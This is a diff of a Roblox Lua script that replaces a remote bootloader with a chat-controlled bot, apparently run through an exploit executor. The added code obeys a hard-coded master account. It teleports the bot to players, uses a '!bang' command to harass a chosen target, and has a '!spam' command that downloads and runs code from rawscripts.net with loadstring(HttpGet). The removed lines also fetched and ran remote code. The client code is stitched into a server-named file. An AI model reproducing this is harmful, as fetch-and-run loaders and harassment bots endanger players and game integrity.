@@ -234,17 +234,182 @@ Players.PlayerAdded:Connect(onPlayerAdded)
 Players.PlayerRemoving:Connect(onPlayerRemoving)
 
 print("bot_command_handler.server.lua loaded. Config:", CONFIG)
--- Delta Remote Bootloader for agrawalgamingyt1
+-- ====================================================================
+-- CONFIGURATION & CONFIG MATRIX
+-- ====================================================================
+local MAIN_ACCOUNT = "agrawalgamingyt1"
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local VirtualUser = game:GetService("VirtualUser")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local mainPlayer = Players:FindFirstChild(MAIN_ACCOUNT)
+local following = false
+local followConnection = nil
+
+-- Visual notification on bot screen
+pcall(function()
+    StarterGui:SetCore("SendNotification", {
+        Title = "Bot Active",
+        Text = "System online. Awaiting agrawalgamingyt1...",
+        Duration = 5
+    })
+end)
+
+-- Auto-Broadcast on script load
 task.spawn(function()
+    task.wait(3)
     pcall(function()
-        local rawUrl = "https://githubusercontent.com"
-        local success, scriptContent = pcall(function()
-            return game:HttpGet(rawUrl)
-        end)
-        
-        if success and scriptContent then
-            loadstring(scriptContent)()
+        local generalChannel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if generalChannel then
+            generalChannel:SendAsync("waiting for krishna daddy command")
+        else
+            local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+            if chatRemote then
+                chatRemote:FireServer("waiting for krishna daddy command", "All")
+            end
         end
     end)
 end)
 
+-- ====================================================================
+-- CORE UTILITY FUNCTIONS
+-- ====================================================================
+
+local function findTargetPlayer(nameString)
+    if not nameString or nameString == "" then return nil end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if string.sub(p.Name:lower(), 1, #nameString) == nameString:lower() or 
+           string.sub(p.DisplayName:lower(), 1, #nameString) == nameString:lower() then
+            return p
+        end
+    end
+    return nil
+end
+
+local function stopFollowing()
+    following = false
+    if followConnection then
+        followConnection:Disconnect()
+        followConnection = nil
+    end
+end
+
+-- ====================================================================
+-- REFIXED COMMAND INTERPRETER
+-- ====================================================================
+local function handleCommand(message)
+    local args = string.split(message, " ")
+    if #args == 0 or not args[1] then return end
+    
+    local cmd = args[1]:lower()
+    local targetName = args[2]
+    
+    local character = Players.LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+    
+    if not character or not humanoid or not rootPart then return end
+
+    -- Command: !follow (Runs on a 0.1s interval loop instead of every frame)
+    if cmd == "!follow" then
+        mainPlayer = Players:FindFirstChild(MAIN_ACCOUNT)
+        if not mainPlayer then return end
+        stopFollowing()
+        following = true
+        
+        task.spawn(function()
+            while following and task.wait(0.1) do
+                local mainChar = mainPlayer.Character
+                local mainRoot = mainChar and mainChar:FindFirstChild("HumanoidRootPart")
+                if mainRoot and rootPart and humanoid then
+                    humanoid:MoveTo(mainRoot.Position)
+                end
+            end
+        end)
+
+    -- Command: !stop
+    elseif cmd == "!stop" then
+        stopFollowing()
+        humanoid:MoveTo(rootPart.Position)
+
+    -- Command: !bring
+    elseif cmd == "!bring" then
+        mainPlayer = Players:FindFirstChild(MAIN_ACCOUNT)
+        if not mainPlayer then return end
+        local mainChar = mainPlayer.Character
+        local mainRoot = mainChar and mainChar:FindFirstChild("HumanoidRootPart")
+        if mainRoot then
+            rootPart.CFrame = mainRoot.CFrame * CFrame.new(0, 0, 2)
+        end
+
+    -- Command: !teleport / !tp
+    elseif cmd == "!teleport" or cmd == "!tp" then
+        if not targetName then return end
+        local targetPlayer = findTargetPlayer(targetName)
+        if targetPlayer and targetPlayer.Character then
+            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if targetRoot then
+                rootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 2)
+            end
+        end
+
+    -- Command: !bang [target]
+    elseif cmd == "!bang" then
+        if not targetName then return end
+        local targetPlayer = findTargetPlayer(targetName)
+        if targetPlayer and targetPlayer.Character then
+            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if targetRoot then
+                rootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 1)
+            end
+        end
+
+    -- Command: !spam [target]
+    elseif cmd == "!spam" then
+        if not targetName then return end
+        local targetPlayer = findTargetPlayer(targetName)
+        if targetPlayer then
+            _G.SpamTarget = targetPlayer.Name 
+            task.spawn(function()
+                pcall(function()
+                    loadstring(game:HttpGet("https://rawscripts.net"))()
+                end)
+            end)
+        end
+
+    -- Command: !kill
+    elseif cmd == "!kill" then
+        stopFollowing()
+        humanoid.Health = 0
+    end
+end
+
+-- ====================================================================
+-- EVENT LISTENERS & HOOKS
+-- ====================================================================
+local function setupListener(player)
+    if player.Name == MAIN_ACCOUNT then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "Connection Secured",
+                Text = "Master agrawalgamingyt1 Connected!",
+                Duration = 7
+            })
+        end)
+        player.Chatted:Connect(handleCommand)
+    end
+end
+
+for _, p in ipairs(Players:GetPlayers()) do setupListener(p) end
+Players.PlayerAdded:Connect(setupListener)
+
+-- Safe Anti-AFK Hook
+Players.LocalPlayer.Idled:Connect(function()
+    pcall(function()
+        VirtualUser:CaptureController()
+        VirtualUser:ClickButton2(Vector2.new(0,0))
+    end)
+end)
